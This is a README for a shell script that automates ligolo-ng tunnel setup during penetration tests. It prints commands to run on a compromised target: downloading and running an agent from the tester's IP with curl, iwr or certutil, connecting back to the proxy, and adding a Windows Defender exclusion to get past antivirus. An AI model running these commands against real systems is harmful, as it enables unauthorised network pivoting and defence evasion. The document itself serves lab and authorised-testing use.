# Ligolo-ng Helper

A single-command setup script for [ligolo-ng](https://github.com/nicocha30/ligolo-ng) that automates the entire process and guides you through each step.

## What is this?

Ligolo-ng creates a VPN-like tunnel to a target network during penetration tests. Once set up, you can access the target network directly (nmap, ssh, curl, etc.) without proxychains.

This helper script eliminates the manual setup by:
- Downloading the correct binaries
- Creating the TUN interface
- Starting a file server for agent transfer
- Providing copy-paste commands with your IP pre-filled
- Showing exactly what to expect at each step

## Quick Start

```bash
# Download the script
curl -O https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/ligolo-helper.sh
chmod +x ligolo-helper.sh

# Run as root - that's it!
sudo ./ligolo-helper.sh auto
```

Then follow the on-screen instructions.

When done, clean up everything:
```bash
sudo ./ligolo-helper.sh cleanup
```

## What `auto` Does

1. Downloads ligolo-ng proxy and agent binaries (Linux/Windows/macOS)
2. Creates and activates the TUN interface
3. Starts a file server on port 8000 for easy agent transfer
4. Displays step-by-step instructions with your actual IP address
5. Starts the proxy server

## Example Output

```
╔═══════════════════════════════════════════════════════════════════════╗
║                        FOLLOW THESE STEPS                             ║
╚═══════════════════════════════════════════════════════════════════════╝

STEP 1: Download agent on target machine

  TARGET IS LINUX:
    curl http://10.10.14.5:8000/ligolo-agent -o /tmp/a && chmod +x /tmp/a

  TARGET IS WINDOWS (PowerShell):
    iwr http://10.10.14.5:8000/ligolo-agent.exe -o a.exe

STEP 2: Run agent on target

  LINUX:
    /tmp/a -connect 10.10.14.5:11601 -ignore-cert

  WINDOWS:
    .\a.exe -connect 10.10.14.5:11601 -ignore-cert

...
```

## All Commands

| Command | Description |
|---------|-------------|
| `auto` | Full automatic setup - download, configure, and start |
| `cleanup` | Stop everything and remove routes/TUN interface |
| `download` | Download ligolo-ng binaries only |
| `setup-tun` | Create TUN interface only |
| `teardown-tun` | Remove TUN interface |
| `proxy [opts]` | Start proxy with custom options |
| `add-route <cidr>` | Add route to target network (e.g., `10.10.10.0/24`) |
| `del-route <cidr>` | Remove a route |
| `agent-cmd [ip]` | Show agent commands for target |
| `status` | Show current ligolo setup status |

## Configuration

Environment variables (optional):

| Variable | Default | Description |
|----------|---------|-------------|
| `LIGOLO_DIR` | `~/.ligolo-ng` | Where to store binaries |
| `TUN_NAME` | `ligolo` | TUN interface name |
| `PROXY_PORT` | `11601` | Proxy listen port |

Example:
```bash
PROXY_PORT=443 ./ligolo-helper.sh auto
```

## IP Detection

The script automatically detects your IP in this order:
1. `tun0` (HackTheBox, TryHackMe, most VPNs)
2. `tun1` (secondary tunnel)
3. `tap0` (alternative tunnel type)
4. Default route (fallback)

## Requirements

- Linux (tested on Kali, Ubuntu, Debian)
- Root privileges (for TUN interface)
- `curl`, `jq`, `tar` (for downloading binaries)
- `python3` (optional, for file server)

On Kali/Debian/Ubuntu:
```bash
sudo apt install curl jq tar
```

## Troubleshooting

### Agent won't connect
Make sure the proxy port is open:
```bash
iptables -I INPUT -p tcp --dport 11601 -j ACCEPT
```

### Windows Defender blocks agent
Add an exclusion on the target before downloading:
```powershell
Add-MpPreference -ExclusionPath "C:\Users\Administrator\a.exe"
```
Then re-download and run the agent.

### Can't download on Windows target
Try certutil instead:
```cmd
certutil -urlcache -split -f http://YOUR_IP:8000/ligolo-agent.exe a.exe
```

### Connection drops when adding route
**Do NOT route the target's own network through ligolo.** This breaks your connection to the target.

Ligolo is for reaching *other* networks behind the target. For example:
- Your target: `10.1.146.220` (you reach via RDP/VPN)
- Target can see internal network: `192.168.x.x` (you can't reach directly)
- Route the *internal* network through ligolo, not `10.1.146.0/24`

If you accidentally added a bad route and lost connectivity:
```bash
sudo ./ligolo-helper.sh cleanup
```

### Route already exists
Remove it first:
```bash
./ligolo-helper.sh del-route 10.10.10.0/24
```

### Invalid CIDR prefix error
The network address must align to the prefix boundary. For example:
- `/24` - last octet must be 0 (e.g., `10.1.146.0/24`)
- `/18` - third octet must be 0, 64, 128, or 192 (e.g., `10.1.128.0/18`)

### TUN interface issues
Reset everything:
```bash
sudo ./ligolo-helper.sh cleanup
sudo ./ligolo-helper.sh auto
```

## Credits

- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) by Nicolas Chatelain
- [Official Documentation](https://docs.ligolo.ng/)

## License

MIT License - See [LICENSE](LICENSE)
